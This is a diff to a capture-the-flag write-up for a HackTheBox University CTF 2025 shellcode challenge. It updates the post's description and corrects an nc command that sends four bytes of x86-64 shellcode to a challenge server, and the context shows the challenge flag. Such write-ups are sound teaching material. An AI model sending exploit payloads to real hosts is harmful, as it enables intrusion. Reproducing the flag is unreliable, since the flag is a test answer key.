@@ -2,7 +2,7 @@
 title: University CTF 2025 - Tinsel Trouble
 published: 2025-12-20
 cover: "./img/unilogo.jpg"
-description: Writeup of challenges from HackTheBox University CTF 2025.
+description: HackTheBox University CTF 2025 pwn writeup for SHL33T, a 4-byte x86-64 shellcode challenge that fixes EBX with a left shift.
 image: "./img/unilogo.jpg"
 tags: [CTF, Pwn, Shellcode, BinaryExploitation]
 category: Writeups
@@ -205,7 +205,7 @@ C1 E3 10 C3
 ## Exploitation
 
 ```bash
-echo -ne "\xC1\xE3\x10" | nc 154.57.164.67 30831
+echo -ne "\xC1\xE3\x10\xC3" | nc 154.57.164.67 30831
 ```
 
 ---
@@ -217,4 +217,3 @@ HTB{sh1ft_2_th3_l3ft_sh1ft_2_th3_right_deb9dab93d244e694e4432c4d8db6862}
 ```
 ![alt text](./img/skibdi.png)
 ---
-
